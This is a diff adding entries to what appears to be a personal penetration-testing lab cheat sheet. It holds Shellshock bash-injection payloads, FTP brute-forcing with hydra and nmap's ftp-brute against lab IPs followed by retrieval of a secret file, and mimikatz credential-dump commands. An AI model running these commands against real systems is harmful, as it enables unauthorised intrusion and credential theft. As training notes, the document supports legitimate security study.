@@ -647,7 +647,7 @@ creds_all
 lsa_dump_sam
 lsa_dump_secrets
 ```
-35)
+35) Shellshock
 
 ```
 ip addr
@@ -658,9 +658,26 @@ open burp suite
 () { :; }; echo; echo; /bin/bash -c 'id'
 () { :; }; echo; echo; /bin/bash -c 'ps -ef'
 ```
+36) ProFTP Recon: Basics
 
+```
+nmap -sV 192.91.250.3
+hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 192.91.250.3 ftp
+echo "sysadmin" > users
+nmap --script ftp-brute --script-args userdb=/root/users -p 21 192.235.127.3
+ftp 192.235.127.3
+Enter username “sysadmin” and password 654321
+ls
+get secret.txt
+exit
+cat secret.txt
+```
 
+37)
 
+```
+
+```
 
 
 
